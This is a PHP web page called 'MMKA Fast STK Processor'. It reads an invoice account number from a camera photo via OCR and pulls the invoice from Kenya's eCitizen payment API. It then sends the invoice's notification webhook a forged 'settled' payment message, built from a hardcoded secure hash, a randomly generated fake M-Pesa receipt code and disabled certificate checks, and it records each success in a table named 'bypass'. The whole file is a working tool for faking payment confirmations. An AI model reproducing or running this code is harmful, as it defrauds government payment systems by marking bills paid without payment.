<?php
// Replace with your own credentials!
$dbhost = "localhost";
$dbname = "your_db";
$dbuser = "your_user";
$dbpass = "your_pass";
$pdo = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass, [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
]);

function generateMpesaCode()
{
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $alphabet1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $alphabet2 = '1234567890';
    $code = '';
    $currentYear = date('Y');
    $code .= $alphabet[$currentYear - 2022 + 16];
    $currentMonth = date('n');
    $code .= $alphabet[$currentMonth - 1];
    $currentDay = date('j');
    if ($currentDay > 9) $code .= $alphabet[($currentDay - 10) % 26];
    else $code .= $currentDay;
    $code .= $alphabet2[rand(0, strlen($alphabet2) - 1)];
    while (strlen($code) < 10) $code .= $alphabet1[rand(0, strlen($alphabet1) - 1)];
    return $code;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
    header('Content-Type: application/json');
    $action = $_POST['ajax_action'];

    if ($action === 'fetch_invoice') {
        $code = trim($_POST['code']);
        $fetch_url = "https://payments.ecitizen.go.ke/api/invoice/checkout/{$code}?callback_url=https://bomayangu.go.ke/payments";
        $invoice_html = @file_get_contents($fetch_url);
        if ($invoice_html !== false && preg_match('/<mpesa-v2\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $msisdn = $attributes['msisdn'] ?? '';
        }
        if ($invoice_html !== false && preg_match('/<airtel-v3\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            echo json_encode([
                'status' => 'success',
                'data' => [
                    'amount' => $attributes['amount_net'] ?? '',
                    'bill_ref' => $attributes['bill_ref'] ?? '',
                    'invoice_no' => $attributes['invoice_no'] ?? '',
                    'notification_url' => $attributes['notification_url'] ?? '',
                    'msisdn' => $msisdn ?? '+254700000000',
                    'date_iso' => $now->format(DateTime::ATOM),
                    'date_custom' => $now->format("Y-m-d H:i:sP T e")
                ]
            ]);
            exit;
        } elseif ($invoice_html !== false && preg_match('/<tkash\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            echo json_encode([
                'status' => 'success',
                'data' => [
                    'amount' => $attributes['amount_net'] ?? '',
                    'bill_ref' => $attributes['bill_ref'] ?? '',
                    'invoice_no' => $attributes['invoice_no'] ?? '',
                    'notification_url' => $attributes['notification_url'] ?? '',
                    'msisdn' => $msisdn ?? '+254700000000',
                    'date_iso' => $now->format(DateTime::ATOM),
                    'date_custom' => $now->format("Y-m-d H:i:sP T e")
                ]
            ]);
            exit;
        } elseif ($invoice_html !== false && preg_match('/<iframe-v3\b(.*?)\/?>/is', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\:\w+|[\w\-]+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            $jsonObj_1 = $attributes[':invoice'] ?? '';
            $obj_1 = json_decode(html_entity_decode($jsonObj_1), true);
            if (isset($obj_1['status'])) {
                echo json_encode([
                    'status' => 'success',
                    'data' => [
                        'amount' => $obj_1['amount_net'] ?? '',
                        'bill_ref' => $obj_1['client_invoice_ref'] ?? '',
                        'invoice_no' => $obj_1['invoice_number'] ?? '',
                        'notification_url1' => $obj_1['service']['metadata']['metadata']['webhook_url'] ?? '',
                        'notification_url' => 'https://app.kwspay.ecitizen.go.ke/api/payment/confirm',
                        'msisdn' => $obj_1['msisdn'] ?? '+254700000000',
                        'date_iso' => $now->format(DateTime::ATOM),
                        'date_custom' => $now->format("Y-m-d H:i:sP T e")
                    ]
                ]);
                exit;
            } else {
                echo json_encode(['status' => 'error', 'message' => 'iFrame 3 Loaded. No Object.']);
                exit;
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Invoice not found.']);
            exit;
        }
    }
    if ($action === 'send_notification') {
        $notification_url = $_POST['notification_url'];
        $amount = $_POST['amount'];
        $bill_ref = $_POST['bill_ref'];
        $invoice_no = $_POST['invoice_no'];
        $msisdn = $_POST['msisdn'];
        $client = $_POST['client'];
        $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
        $payment_date_iso = $now->format(DateTime::ATOM);
        $payment_date_custom = $now->format("Y-m-d H:i:sP T e");
        $payload = [
            "status" => "settled",
            "secure_hash" => "NTk4NGE3NTIxNjk4OTg2MjhmMWZmMzU4NmU4NDBmYmVlYWVlYTMxN2E1MWMwYzg4MTU3YTBmN2Q0NGQ3ZjUyMA==",
            "phone_number" => $msisdn,
            "payment_reference" => [[
                "payment_reference" => generateMpesaCode(),
                "payment_date" => $payment_date_iso,
                "inserted_at" => $payment_date_iso,
                "currency" => "KES",
                "amount" => $amount
            ]],
            "payment_date" => $payment_date_custom,
            "payment_channel" => "MPESA",
            "last_payment_amount" => "0",
            "invoice_number" => $invoice_no,
            "invoice_amount" => $amount . ".00",
            "currency" => "KES",
            "client_invoice_ref" => $bill_ref,
            "amount_paid" => $amount
        ];
        $ch = curl_init($notification_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $response = curl_exec($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($http_status === 200 || $http_status === 201) {
            $stmt = $pdo->prepare('INSERT INTO bypass (invoice_no, amount, client, ref, route, extdoc) VALUES (?, ?, ?, ?, ?, ?)');
            $stmt->execute([$invoice_no, $amount, $client, $notification_url, $notification_url, $bill_ref]);
            $dt1 = "Data inserted successfully recorded.";
        } else {
            $dt1 = "Insertion Not Done!";
        }
        echo json_encode([
            'status' => ($http_status === 200 || $http_status === 201) ? 'success' : 'error',
            'message' => $response . '<br/>' . $dt1 . '<br/> Status Code: ' . $http_status . '<br/><br/>' . json_encode($payload, JSON_PRETTY_PRINT)
        ]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MMKA Fast STK Processor</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4.0.2/dist/tesseract.min.js"></script>
</head>
<body class="bg-light">
    <div class="container py-5">
        <h3 class="mb-3 text-center">MMKA Fast STK Processor</h3>
        <button id="scanBtn" class="btn btn-warning mb-3 w-100">Scan STK Push (Camera)</button>
        <input type="file" accept="image/*" capture="environment" id="stkCapture" style="display:none;">
        <form id="fetchForm" class="mb-4">
            <div class="input-group">
                <input type="text" class="form-control" name="code" placeholder="Account Number (auto-filled)" required>
                <button type="submit" class="btn btn-primary">Fetch Invoice</button>
            </div>
        </form>
        <form id="notifyForm" class="mt-4 d-none">
            <h5 class="mb-3">Payment Notification Details</h5>
            <div class="row">
                <div class="col-md-6">
                    <div class="mb-2"><label class="form-label">Notification URL</label><input type="text" class="form-control" name="notification_url" readonly></div>
                    <div class="mb-2"><label class="form-label">Amount</label><input type="text" class="form-control" name="amount" readonly></div>
                    <div class="mb-2"><label class="form-label">Bill Reference</label><input type="text" class="form-control" name="bill_ref" readonly></div>
                    <div class="mb-2"><label class="form-label">Invoice Number</label><input type="text" class="form-control" name="invoice_no" readonly></div>
                </div>
                <div class="col-md-6">
                    <div class="mb-2"><label class="form-label">Date ISO</label><input type="text" class="form-control" name="date_iso" readonly></div>
                    <div class="mb-2"><label class="form-label">Date Custom</label><input type="text" class="form-control" name="date_custom" readonly></div>
                    <div class="mb-2"><label class="form-label">MSISDN</label><input type="text" class="form-control" name="msisdn" readonly></div>
                    <div class="mb-2">
                        <label class="form-label">Use Client</label>
                        <select class="form-select" name="client">
                            <?php
                            $stmt = $pdo->query('SELECT * FROM clients ORDER BY name ASC');
                            foreach ($stmt as $rows) {
                                echo '<option value="' . $rows['name'] . '">' . $rows['name'] . '</option>';
                            }
                            ?>
                        </select>
                    </div>
                </div>
            </div>
            <button type="submit" class="btn btn-success w-100">Submit Notification</button>
        </form>
        <div class="mt-3" id="result"></div>
        <!-- Loader Modal -->
        <div class="modal fade" id="loaderModal" tabindex="-1" aria-hidden="true" style="background:rgba(255,255,255,0.7)">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content bg-transparent border-0 shadow-none">
                    <div class="modal-body text-center">
                        <div class="spinner-border text-primary" style="width: 4rem; height: 4rem;" role="status">
                            <span class="visually-hidden">Loading...</span>
                        </div>
                        <div class="mt-3 text-primary fw-bold">Processing...</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Loader modal instance
        const loaderModal = new bootstrap.Modal(document.getElementById('loaderModal'), { backdrop: 'static', keyboard: false });
        function showLoader() { loaderModal.show(); }
        function hideLoader() { loaderModal.hide(); }

        let t0, t1;

        $('#scanBtn').on('click', function() { $('#stkCapture').click(); });

        $('#stkCapture').on('change', function(e) {
            if (!e.target.files.length) return;
            let file = e.target.files[0];
            t0 = performance.now();
            showLoader();
            Tesseract.recognize(
                file,
                'eng',
                { logger: m => console.log(m) }
            ).then(({ data: { text } }) => {
                // Try to extract account number with various possible patterns
                let match = text.match(/Account\s*no\.?\s*([A-Z0-9]+)/i)
                    || text.match(/no\.?\s*([A-Z0-9]{8,10})/i)
                    || text.match(/([A-Z0-9]{8,10})/); // fallback to first all-caps sequence
                if (match) {
                    let code = match[1].trim();
                    $('input[name="code"]').val(code);
                    $('#fetchForm').trigger('submit');
                } else {
                    $('#result').html('<div class="alert alert-danger">Failed to detect account number. Please crop image or try again.</div>');
                    hideLoader();
                }
            }).catch(function(err) {
                $('#result').html('<div class="alert alert-danger">OCR failed: ' + err + '</div>');
                hideLoader();
            });
        });

        $('#fetchForm').on('submit', function(e) {
            e.preventDefault();
            showLoader();
            const code = $(this).find('input[name="code"]').val();
            $.post('', { ajax_action: 'fetch_invoice', code }, function(res) {
                if (res.status === 'success') {
                    Object.entries(res.data).forEach(([k, v]) => {
                        $('#notifyForm').find(`[name="${k}"]`).val(v);
                    });
                    $('#notifyForm').removeClass('d-none');
                    $('#result').html('<div class="alert alert-success">Invoice loaded. Submitting notification…</div>');
                    // Immediately submit notification
                    setTimeout(() => { $('#notifyForm').trigger('submit'); }, 300);
                } else {
                    $('#result').html(`<div class="alert alert-danger">${res.message}</div>`);
                    $('#notifyForm').addClass('d-none');
                    hideLoader();
                }
            }, 'json');
        });

        $('#notifyForm').on('submit', function(e) {
            e.preventDefault();
            const formData = $(this).serializeArray();
            const data = { ajax_action: 'send_notification' };
            formData.forEach(item => data[item.name] = item.value);
            $.post('', data, function(res) {
                t1 = performance.now();
                let elapsed = ((t1 - t0) / 1000).toFixed(3);
                $('#result').html(`<div class="alert alert-${res.status === 'success' ? 'success' : 'danger'}">
                    <b>API Response:</b><br>${res.message}<br>
                    <b>Elapsed time from scan to result: ${elapsed}s</b>
                </div>`);
                hideLoader();
            }, 'json');
        });

        $(document).ajaxStop(function() { hideLoader(); });
    </script>
</body>
</html>
